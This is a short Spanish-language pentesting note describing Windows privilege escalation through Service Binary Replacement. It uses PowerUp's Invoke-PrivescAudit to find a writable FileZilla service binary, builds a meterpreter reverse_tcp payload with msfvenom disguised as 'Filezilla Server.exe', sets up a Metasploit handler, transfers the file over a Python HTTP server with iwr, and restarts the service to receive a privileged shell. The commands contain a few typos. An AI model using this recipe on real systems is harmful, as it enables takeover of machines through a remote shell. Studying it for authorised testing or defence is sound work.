
Hay servicios ejecutados en el background que tienen permisos elevados, la idea es conseguir detectar una configuración erronea de estos servicios.

Los pasos a seguir serían:

1. Identificar servicios vulnerables.
2. Analizar los permisos de esos servicios.
3. Modificar la configuración del servicio.
4. Reiniciar el servicio.

La técnica a realizar es Service Binary Replacement:

1. Detectar el servicio con permisos vulnerables
2. Remplazar el ejecutable.
3. Reiniciar el servicio.

Para poder detectar estos servicios mal configurados vamos a utilizar PowerUp.ps1:

```powershell
. .\PowerUp.ps1
Invoke-PrivescAudit
```

En este ejemplo nos muestra un binario de Filezilla que puede ser modificable y que se puede reiniciar.

![[Pasted image 20250218093210.png]]

Ahora vamos a generar un payload con msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=our_ip LPORT=port -f exe > 'Filezilla Server.exe'

#Necesitamos ponernos a la escucha para cuando se ejecute el payload, esto se puede hacer mediante un nc o un http_handler

mfsconsole
use exploit/multi/handler
show options
set InitialAutoRunScript post/windows/manage/migrate

#Ahora creamos un servidor para transferir el archivo
python -m SimpleHTTPServer 80

#Desde el powershell podemos descargar el binario con:
iwr -UsePasicParsing -Uri 'http://ip/file' -OutFile 'ruta'
```

Una vez se reinicie el servicio deberíamos recibir la sesión en el meterpreter.

